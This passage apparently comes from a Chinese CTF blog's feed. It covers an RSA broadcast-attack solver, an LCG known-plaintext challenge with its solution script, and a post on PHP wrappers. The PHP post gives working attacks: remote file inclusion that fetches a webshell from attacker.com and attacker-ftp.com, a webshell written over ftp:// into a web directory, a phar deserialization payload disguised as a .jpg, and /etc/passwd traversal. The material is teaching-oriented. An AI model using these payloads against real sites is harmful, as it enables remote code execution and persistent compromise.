46186240819076690248235492196228128599822002268014359444368898414937734806009161030424589993541799877081745454934484263188270879142125136786221625234555265815513136730416539407710862948861531339065039071959576035606192732936477944770308784472646015244527805057990939765708793705044236665364664490419874206900,</span><br><span class="line">   85756449024868529058704599481168414715291172247059370174556127800630896693021701121075838517372920466708826412897794900729896389468152213884232173410022054605870785910461728567377769960823103334874807744107855490558726013068890632637193410610478514663078901021307258078678427928255699031215654693270240640198,</span><br><span class="line">   14388767329946097216670270960679686032536707277732968784379505904021622612991917314721678940833050736745004078559116326396233622519356703639737886289595860359630019239654690312132039876082685046329079266785042428947147658321799501605837784127004536996628492065409017175037161261039765340032473048737319069656,</span><br><span class="line">   1143736792108232890306863524988028098730927600066491485326214420279375304665896453544100447027809433141790331191324806205845009336228331138326163746853197990596700523328423791764843694671580875538251166864957646807184041817863314204516355683663859246677105132100377322669627893863885482167305919925159944839,</span><br><span class="line">   2978800921927631161807562509445310353414810029862911925227583943849942080514132963605492727604495513988707849133045851539412276254555228149742924149242124724864770049898278052042163392380895275970574317984638058768854065506927848951716677514095183559625442889028813635385408810698294574175092159389388091981,</span><br><span class="line">   16200944263352278316040095503540249310705602580329203494665614035841657418101517016718103326928336623132935178377208651067093136976383774189554806135146237406248538919915426183225265103769259990252162411307338473817114996409705345401251435268136647166395894099897737607312110866874944619080871831772376466376,</span><br><span class="line">   31551601425575677138046998360378916515711528548963089502535903329268089950335615563205720969393649713416910860593823506545030969355111753902391336139384464585775439245735448030993755229554555004154084649002801255396359097917380427525820249562148313977941413268787799534165652742114031759562268691233834820996,</span><br><span class="line">   25288164985739570635307839193110091356864302148147148153228604718807817833935053919412276187989509493755136905193728864674684139319708358686431424793278248263545370628718355096523088238513079652226028236137381367215156975121794485995030822902933639803569133458328681148758392333073624280222354763268512333515]</span><br><span class="line">n = 1</span><br><span class="line">for i in n_list:</span><br><span class="line">   n = n * i</span><br><span class="line"></span><br><span class="line">n_ = []</span><br><span class="line">for i in n_list:</span><br><span class="line">   n_.append(n // i)</span><br><span class="line"></span><br><span class="line">t = []</span><br><span class="line">for i in range(9):</span><br><span class="line">   t.append(inverse(n_[i], n_list[i]))</span><br><span class="line"></span><br><span class="line">x = 0</span><br><span class="line">for i in range(len(n_list)):</span><br><span class="line">   x = c_list[i] * n_[i] * t[i] + x</span><br><span class="line">x = x % n</span><br><span class="line">print(x)</span><br><span class="line">x = iroot(x, 9)[0]</span><br><span class="line">print(long_to_bytes(x))</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RSA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LCG（线性同余生成器）简记</title>
      <link href="/blog/2026/02/08/LCG/"/>
      <url>/blog/2026/02/08/LCG/</url>
      
        <content type="html"><![CDATA[<script type="text/javascript" async  src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script><script>MathJax = {  tex: {    inlineMath: [['$', '$'], ['\\(', '\\)']],    displayMath: [['$$', '$$'], ['\\[', '\\]']]  },  svg: {    fontCache: 'global'  }};</script><p> LCG（线性同余生成器）简记 </p><p>标签（空格分隔）： LCG</p><hr><h2 id="LCG-线性同余生成器"><a href="#LCG-线性同余生成器" class="headerlink" title="LCG(线性同余生成器)"></a>LCG(线性同余生成器)</h2><p>LCG属于PRNG(伪随机数生成器)和stream cipher(流密码)的一种，是一种产生伪随机数的方法。</p><br><center>$X_{n+1} =(a∗X_n +b) \ mod\ m$</center><br><p>其中，Xn代表第n个生成的随机数，X0被称为种子值。这里还定义了三个整数：a乘数、b增量、m模数，是产生器设定的常数。</p><p>1、m是随机序列的模数，必须一个大于0的正整数。一般是一个比较大的素数或者是2的幂，以便提供较长的周期长度。<br>2、a是乘数，必须是一个与m互素的正整数。<br>3、b是增量，也必须是一个与m互素的正整数。<br>4、$t_n$ &#x3D; $X_{n+1}$ -$X_{n}$,同理$t_{n-1}$&#x3D;$X_{n}$ -$X_{n-1}$</p><hr><h2 id="求其中参数公式如下"><a href="#求其中参数公式如下" class="headerlink" title="求其中参数公式如下"></a>求其中参数公式如下</h2><hr><h3 id="由-X-n-反推-X-n-1"><a href="#由-X-n-反推-X-n-1" class="headerlink" title="由$X_n$反推$X_{n+1}$"></a><strong>由$X_n$反推$X_{n+1}$</strong></h3><center>$X_{n} = a^{-1}*(X_{n+1} -b) \mod m$</center><p>Ps：**$a^{-1}$是a的逆元**</p><hr><h3 id="求a"><a href="#求a" class="headerlink" title="求a"></a>求a</h3><p>求a可以表示为</p><center>$a=t_{n-1}^{-1}*t_{n}  \ mod \ m$</center><br><p>Ps：**$t_{n-1}^{-1}$是$t_{n-1}$的逆元**</p><br><hr><h3 id="求b"><a href="#求b" class="headerlink" title="求b"></a>求b</h3><center> $b = (X_{n+1} - a*X_{n}) \ mod \ m$ </center><hr><h3 id="求m"><a href="#求m" class="headerlink" title="求m"></a>求m</h3><center>$t_{n}=X_{n+1}-X_{n}=(a*X_n+b)-(a*X_{n-1}+b)=a*(X_n-X_{n-1})=a*t_{n-1}\mod\ m$</center><center>$t_{n+1} t_{n-1} - t_n t_n = a*a*t_{n-1}*t_{n-1} - a*t_{n-1}*a*t_{n-1} = 0 \mod m$</center><p>即$T_n &#x3D; t_{n+1} t_{n-1} - t_n^2$是 m 的倍数，故$T_n 和 T_{n-1}$的最大公因数即为 m</p><hr><h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><p>实际做题的话碰到直接给了a,b,m这些便很好解决如果是碰上别的如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">from secrets import randbits</span><br><span class="line">from secret import FLAG, P_known</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def gen():</span><br><span class="line">    while True:</span><br><span class="line">        m = randbits(63) | (1 &lt;&lt; 62) | 1</span><br><span class="line">        if m &gt; 2**62:</span><br><span class="line">            break</span><br><span class="line">    a = randbits(62) | 3</span><br><span class="line">    c = randbits(62) | 1</span><br><span class="line">    s0 = randbits(62) | 5</span><br><span class="line">    return m, a, c, s0</span><br><span class="line"></span><br><span class="line">def LCG(m, a, c, s0, nblocks):</span><br><span class="line">    x = s0</span><br><span class="line">    out = []</span><br><span class="line">    for _ in range(nblocks):</span><br><span class="line">        x = (a * x + c) % m</span><br><span class="line">        out.append(x)</span><br><span class="line">    return out</span><br><span class="line"></span><br><span class="line">def encrypt(m, a, c, s0, plaintext: bytes) -&gt; bytes:</span><br><span class="line">    padlen = (-len(plaintext)) % 8</span><br><span class="line">    pt = plaintext + b&#x27;\x00&#x27; * padlen</span><br><span class="line">    blocks = [int.from_bytes(pt[i:i+8], &#x27;big&#x27;) for i in range(0, len(pt), 8)]</span><br><span class="line">    ks = LCG(m, a, c, s0, len(blocks))</span><br><span class="line">    cblocks = [b ^ k for b, k in zip(blocks, ks)]</span><br><span class="line">    return b&#x27;&#x27;.join(cb.to_bytes(8, &#x27;big&#x27;) for cb in cblocks)</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    m, a, c, s0 = gen()</span><br><span class="line">    cipher  = encrypt(m, a, c, s0,  P_known + FLAG)</span><br><span class="line"></span><br><span class="line">    C_known = cipher[:len(P_known)]</span><br><span class="line">    C_flag  = cipher[len(P_known):len(P_known) + len(FLAG)]</span><br><span class="line"></span><br><span class="line">    print(&quot;P_known =&quot;,P_known)</span><br><span class="line">    print(&quot;C_known =&quot;, C_known.hex())</span><br><span class="line">    print(&quot;C_flag  =&quot;, C_flag.hex())</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">P_know = b&#x27;Insecure_linear_congruential_random_number!!!!!!&#x27;</span><br><span class="line">C_known = 44e18dfa1acd14aa790fc3bac4ca54c137bcd47bdfc2209a53b83715ecad3e29249845720588cac007bfb94f8476d91a</span><br><span class="line">C_flag  = 1995374a5b64c6696578c1d5bdc6fa3d1e974b813436eab4348db801fb7a6703658eaa4fefa2c6fd6792beb969df8ca70ad87a4f4aea6ca0040d65a3c1e3a5bf2655cafc1e5603a171edc9aa077c0ca264677c351907f35756c14dd7ece428cb424a3804b544ccb53e99935f9bc2d8483dd7587379c99b3542c222008a</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure><p>这个便是已知明文攻击，将明文和密文已知部分进行异或便能得到一部分的$X_{n}$<br>然后再是正常解题<br>exp:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">from secrets import randbits</span><br><span class="line">import sys</span><br><span class="line">from functools import reduce</span><br><span class="line">from math import gcd</span><br><span class="line">import gmpy2</span><br><span class="line">p_know = b&#x27;Insecure_linear_congruential_random_number!!!!!!&#x27;</span><br><span class="line">c_know = &#x27;44e18dfa1acd14aa790fc3bac4ca54c137bcd47bdfc2209a53b83715ecad3e29249845720588cac007bfb94f8476d91a&#x27;</span><br><span class="line">c_flag  =  &#x27;1995374a5b64c6696578c1d5bdc6fa3d1e974b813436eab4348db801fb7a6703658eaa4fefa2c6fd6792beb969df8ca70ad87a4f4aea6ca0040d65a3c1e3a5bf2655cafc1e5603a171edc9aa077c0ca264677c351907f35756c14dd7ece428cb424a3804b544ccb53e99935f9bc2d8483dd7587379c99b3542c222008a&#x27;</span><br><span class="line"></span><br><span class="line">c_know = bytes.fromhex(c_know)</span><br><span class="line">c_flag = bytes.fromhex(c_flag)</span><br><span class="line"></span><br><span class="line">c_know=[int.from_bytes(c_know[i:i+8], &#x27;big&#x27;) for i in range(0, len(c_know), 8)]</span><br><span class="line">p_know=[int.from_bytes(p_know[i:i+8], &#x27;big&#x27;) for i in range(0, len(p_know), 8)]</span><br><span class="line"></span><br><span class="line">box = [p ^ c for p, c in zip(p_know, c_know)]</span><br><span class="line">t = [box[i+1]-box[i] for i in range(len(box)-1)]</span><br><span class="line">T1= t[3]*t[1]-t[2]*t[2]</span><br><span class="line">T2= t[4]*t[2]-t[3]*t[3]</span><br><span class="line"></span><br><span class="line">def egcd(a,b):</span><br><span class="line">    if a==0 :</span><br><span class="line">        return b</span><br><span class="line">    else :</span><br><span class="line">        return gcd(b%a,a)</span><br><span class="line"></span><br><span class="line">m=egcd(T1,T2)</span><br><span class="line">print(m)</span><br><span class="line"></span><br><span class="line">t1=box[2]-box[1]</span><br><span class="line">t0=box[1]-box[0]</span><br><span class="line">a=gmpy2.divm(t1,t0,m)</span><br><span class="line">print(a)</span><br><span class="line"></span><br><span class="line">b=(box[2]-box[1]*a)%m</span><br><span class="line">print(b)</span><br><span class="line"></span><br><span class="line">def LCG(m, a, c, s0, nblocks):</span><br><span class="line">    x = s0         </span><br><span class="line">    out = []      </span><br><span class="line">    for _ in range(nblocks):</span><br><span class="line">        out.append(x)           </span><br><span class="line">        x = (a * x + c) % m     </span><br><span class="line">    return out</span><br><span class="line"></span><br><span class="line">abox = LCG(m, a, b, box[0], 22)</span><br><span class="line"></span><br><span class="line">abox = LCG(m, a, b, box[0], 22)</span><br><span class="line">raw_c_know = bytes.fromhex(&#x27;44e18dfa1acd14aa790fc3bac4ca54c137bcd47bdfc2209a53b83715ecad3e29249845720588cac007bfb94f8476d91a&#x27;)</span><br><span class="line">raw_c_flag = bytes.fromhex(&#x27;1995374a5b64c6696578c1d5bdc6fa3d1e974b813436eab4348db801fb7a6703658eaa4fefa2c6fd6792beb969df8ca70ad87a4f4aea6ca0040d65a3c1e3a5bf2655cafc1e5603a171edc9aa077c0ca264677c351907f35756c14dd7ece428cb424a3804b544ccb53e99935f9bc2d8483dd7587379c99b3542c222008a&#x27;)</span><br><span class="line"></span><br><span class="line">allm = raw_c_know + raw_c_flag</span><br><span class="line"></span><br><span class="line">keystream = b&#x27;&#x27;.join(k.to_bytes(8, &#x27;big&#x27;) for k in abox)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = bytes([c ^ k for c, k in zip(allm, keystream)])</span><br><span class="line">print(flag.decode(errors=&#x27;ignore&#x27;))</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LCG </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP伪协议</title>
      <link href="/blog/2026/02/08/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
      <url>/blog/2026/02/08/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP伪协议"><a href="#PHP伪协议" class="headerlink" title="PHP伪协议"></a>PHP伪协议</h1><p>标签 ： PHP</p><hr><h2 id="伪装协议"><a href="#伪装协议" class="headerlink" title="伪装协议"></a>伪装协议</h2><pre><code>1 file://2 http://3 ftp://4 php://5 zlib://6 data://7 glob://8 phar://9 ssh2://10 rar://11 ogg://12 expect://</code></pre><p><strong>常见过滤器：</strong></p><ul><li><code>convert.base64-encode</code> &#x2F; <code>convert.base64-decode</code></li><li><code>convert.quoted-printable-encode</code></li><li><code>string.rot13</code></li><li><code>string.strip_tags</code></li></ul><hr><h2 id="php-x2F-x2F-filter-详解："><a href="#php-x2F-x2F-filter-详解：" class="headerlink" title="php:&#x2F;&#x2F;filter 详解："></a><strong>php:&#x2F;&#x2F;filter 详解：</strong></h2><ul><li><p><strong>读取模式（read）</strong><br>语法：<code>php://filter/read=filter_name/resource=target_file</code><br>示例：  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="string">&quot;php://filter/read=convert.base64-encode/resource=index.php&quot;</span>;</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><p>此时会将 <code>index.php</code> 的源码进行 Base64 编码后输出，绕过直接执行 PHP 代码，常用于源码泄露。</p></li><li><p><strong>写入模式（write）</strong><br>语法：<code>php://filter/write=filter_name/resource=target_file</code><br>示例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$data</span> = <span class="string">&quot;&lt;?php phpinfo(); ?&gt;&quot;</span>; <span class="comment">// 要写入的内容</span></span><br><span class="line"><span class="variable">$target</span> = <span class="string">&quot;php://filter/write=string.rot13/resource=shell.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$target</span>, <span class="title function_ invoke__">str_rot13</span>(<span class="variable">$data</span>)); <span class="comment">// 注意需对数据预处理</span></span><br></pre></td></tr></table></figure></li></ul><hr><h2 id="file-x2F-x2F-详解"><a href="#file-x2F-x2F-详解" class="headerlink" title="file:&#x2F;&#x2F;详解"></a><strong>file:&#x2F;&#x2F;详解</strong></h2><p>file:&#x2F;&#x2F; 封装器允许 PHP 像处理 URL 一样处理本地文件路径，这使得 PHP 可以使用统一的 I&#x2F;O 函数（如 fopen()、file_get_contents() 等）来操作本地文件。</p><p>语法：<code>file:///path/to/your/file</code> </p><p>由于php文件的操作函数会默认使用file:&#x2F;&#x2F;协议来处理</p><p><strong>原理展示</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">程序代码:include($_get[`page`]);</span><br><span class="line">用户输入:../../../etc/passwd</span><br><span class="line">实际处理: include(`file://../../../etc/passwd`)</span><br></pre></td></tr></table></figure><p>就可以根据file:&#x2F;&#x2F;协议来进行目录遍历，从而获得目标文件</p><hr><h2 id="data-x2F-x2F-详解"><a href="#data-x2F-x2F-详解" class="headerlink" title="data:&#x2F;&#x2F;详解"></a><strong>data:&#x2F;&#x2F;详解</strong></h2><p>基本语法<code>data:[&lt;MIME-type&gt;][;charset=&lt;encoding&gt;][;base64],&lt;data&gt;</code><br>工作方式： 当 PHP 遇到这个协议时，它不会进行任何网络或文件系统的操作，而是直接从 URI 的 <data> 部分提取内容，并将其作为文件内容提供给函数（如 include, file_get_contents 等）。</p><h2 id="攻击案例"><a href="#攻击案例" class="headerlink" title="攻击案例"></a>攻击案例<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if(file_get_contents($file2) === &quot;hello ctf&quot;)</span><br><span class="line">        &#123;</span><br><span class="line">            include($file1);</span><br><span class="line">        &#125;</span><br><span class="line">        //就需要构造file2=data://text/plain,hellow ctf</span><br></pre></td></tr></table></figure></h2><h2 id="http-x2F-x2F-详解"><a href="#http-x2F-x2F-详解" class="headerlink" title="http:&#x2F;&#x2F;详解"></a><strong>http:&#x2F;&#x2F;详解</strong></h2><p>它与我们之前讨论的 file:&#x2F;&#x2F;（本地文件）和 data:&#x2F;&#x2F;（嵌入数据）不同，http:&#x2F;&#x2F; 是用来连接到 Web 服务器并获取其内容的。</p><p>**<code>http://</code>**协议是实现远程文件包含的重要伪协议</p><p><em><strong>攻击前提</strong></em>：攻击前提条件（关键）： 要利用 http:&#x2F;&#x2F; 来包含文件，PHP 配置文件中的 allow_url_include 必须设置为 On。如果只是 file_get_contents() 或 fopen()，只需要 allow_url_fopen &#x3D; On。</p><p>攻击步骤：<br>攻击者首先在自己的服务器（例如 <a href="http://attacker.com)上创建一个包含/">http://attacker.com）上创建一个包含</a> PHP 代码的文件，例如 shell.txt：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    system($_GET[&#x27;cmd&#x27;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>攻击的目标存在一个文件包含漏洞（include($get_[<code>a</code>])）<br>   然后利用http:&#x2F;&#x2F;协议来进行攻击</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://target.com/ &lt; target.php &gt; ? a = http://attacker.com/shell.txt</span><br></pre></td></tr></table></figure><p>后续可以依靠antsword和hackbar等工具进行攻击</p><hr><h2 id="ftp-x2F-x2F-详解"><a href="#ftp-x2F-x2F-详解" class="headerlink" title="ftp:&#x2F;&#x2F;详解"></a><strong>ftp:&#x2F;&#x2F;详解</strong></h2><p>工作方式： PHP 会尝试根据 URL 中提供的信息连接到指定的 FTP 服务器，并对该服务器上的文件进行读取、写入或修改操作（取决于使用的函数和 FTP 权限）。</p><h2 id="URL格式-ftp-username-password-hostname-port-path-to-file-攻击方法1"><a href="#URL格式-ftp-username-password-hostname-port-path-to-file-攻击方法1" class="headerlink" title="URL格式**ftp://[username[:password]@]hostname[:port]/path/to/file**攻击方法1"></a>URL格式**<code>ftp://[username[:password]@]hostname[:port]/path/to/file</code>**<br><br>攻击方法1</h2><p>依旧是在include()漏洞存在的情况和上述http:&#x2F;&#x2F;协议一样，在自己的服务器(<a href="http://attacker.com)上面的文件可以上传到目标漏洞的服务器,然后在根据include/">http://attacker.com)上面的文件可以上传到目标漏洞的服务器，然后在根据include</a>($_get [ <code>a</code>])来进行攻击<br>攻击如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/&lt;target.php&gt;?a=ftp://anonymous@attacker-ftp.com/shell.txt</span><br></pre></td></tr></table></figure><p>此时假设可以匿名且无密码</p><h2 id="结果：-漏洞程序会通过-FTP-下载-shell-txt-的内容，然后-include-函数会执行其中的-PHP-代码，导致-RCE（远程代码执行）攻击方法2"><a href="#结果：-漏洞程序会通过-FTP-下载-shell-txt-的内容，然后-include-函数会执行其中的-PHP-代码，导致-RCE（远程代码执行）攻击方法2" class="headerlink" title="结果： 漏洞程序会通过 FTP 下载 shell.txt 的内容，然后 include() 函数会执行其中的 PHP 代码，导致 RCE（远程代码执行）攻击方法2"></a>结果： 漏洞程序会通过 FTP 下载 shell.txt 的内容，然后 include() 函数会执行其中的 PHP 代码，导致 RCE（远程代码执行）<br><br>攻击方法2</h2><p>如果应用程序允许用户控制目标路径和写入内容，并且使用了 fopen() 或 file_put_contents()，理论上可以滥用 ftp:&#x2F;&#x2F; 来修改远程 FTP 服务器上的文件（例如修改一个 Web 目录下的文件来植入 Webshell）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$target = &quot;ftp://user:pass@target-ftp.com/www/config.php&quot;;</span><br><span class="line">$data = &quot;&lt;?php system(&#x27;id&#x27;); ?&gt;&quot;;</span><br><span class="line">file_put_contents($target, $data);</span><br></pre></td></tr></table></figure><hr><h2 id="phar-x2F-x2F-详解"><a href="#phar-x2F-x2F-详解" class="headerlink" title="phar:&#x2F;&#x2F;详解"></a><strong>phar:&#x2F;&#x2F;详解</strong></h2><p>Phar（PHP Archive） 是PHP的打包格式，类似于Java的JAR文件。phar:&#x2F;&#x2F;伪协议允许直接访问Phar文件内部的内容。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>攻击者利用目标系统中存在的<strong>文件包含漏洞</strong>（如 <code>include($_GET[&#39;a&#39;]);</code>），结合PHP支持的伪协议，可实现远程代码执行。在已知可通过 <code>http://</code> 协议进行远程文件包含的基础上，进一步利用 <code>ftp://</code> 和 <code>phar://</code> 等协议扩大攻击面。<br>####攻击思路<br>当PHP代码中存在文件操作函数（如file_get_contents()、include()、unlink()等）且用户能控制参数时，可能触发反序列化漏洞。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">创建恶意文件</span><br><span class="line">&lt;?php</span><br><span class="line">class EvilClass &#123;</span><br><span class="line">    public $cmd = &#x27;whoami&#x27;;</span><br><span class="line">    </span><br><span class="line">    public function __destruct() &#123;</span><br><span class="line">        system($this-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 创建Phar文件</span><br><span class="line">$phar = new Phar(&#x27;evil.phar&#x27;);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;addFromString(&#x27;test.txt&#x27;, &#x27;test&#x27;);</span><br><span class="line">$phar-&gt;setStub(&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;);</span><br><span class="line"></span><br><span class="line">// 添加恶意对象</span><br><span class="line">$object = new EvilClass();</span><br><span class="line">$object-&gt;cmd = $_GET[&#x27;cmd&#x27;];  // RCE命令</span><br><span class="line">$phar-&gt;setMetadata($object);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"></span><br><span class="line">// 重命名绕过上传限制</span><br><span class="line">rename(&#x27;evil.phar&#x27;, &#x27;evil.jpg&#x27;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><hr><h3 id="ftp-x2F-x2F-协议攻击详解"><a href="#ftp-x2F-x2F-协议攻击详解" class="headerlink" title="ftp:&#x2F;&#x2F; 协议攻击详解"></a><strong>ftp:&#x2F;&#x2F; 协议攻击详解</strong></h3><p>PHP 支持通过 <code>ftp://</code> 协议访问远程 FTP 服务，其格式为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp://[username[:password]@]hostname[:port]/path/to/file</span><br></pre></td></tr></table></figure><h4 id="攻击方法-1：结合文件包含进行-RCE"><a href="#攻击方法-1：结合文件包含进行-RCE" class="headerlink" title="攻击方法 1：结合文件包含进行 RCE"></a><strong>攻击方法 1：结合文件包含进行 RCE</strong></h4><p>当存在 <code>include($_GET[&#39;a&#39;])</code> 漏洞时，攻击者可构造如下请求：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://target.com/vuln.php?a=ftp://anonymous@attacker-ftp.com/shell.txt</span><br></pre></td></tr></table></figure><p>若目标服务器可出站连接且 FTP 服务允许匿名访问，PHP 将下载 <code>shell.txt</code> 并解析其中的 PHP 代码，造成<strong>远程代码执行（RCE）</strong>。</p><h4 id="攻击方法-2：写入远程-FTP-文件（反向利用）"><a href="#攻击方法-2：写入远程-FTP-文件（反向利用）" class="headerlink" title="攻击方法 2：写入远程 FTP 文件（反向利用）"></a><strong>攻击方法 2：写入远程 FTP 文件（反向利用）</strong></h4><p>若应用使用 <code>file_put_contents()</code> 或 <code>fopen()</code> 写入文件，且路径可控，则可滥用 <code>ftp://</code> 修改远程 FTP 服务器上的文件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$target</span> = <span class="string">&quot;ftp://user:pass@target-ftp.com/public_html/backup.php&quot;</span>;</span><br><span class="line"><span class="variable">$data</span> = <span class="string">&quot;&lt;?php system(<span class="subst">$_GET</span>[&#x27;cmd&#x27;]); ?&gt;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$target</span>, <span class="variable">$data</span>);</span><br></pre></td></tr></table></figure><p>成功后将在目标 Web 目录下植入 WebShell，实现持久化控制。</p><hr>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL&#39;select&#39;绕过</title>
      <link href="/blog/2026/01/28/SQL&#39;select&#39;%E7%BB%95%E8%BF%87/"/>
      <url>/blog/2026/01/28/SQL&#39;select&#39;%E7%BB%95%E8%BF%87/</url>
      
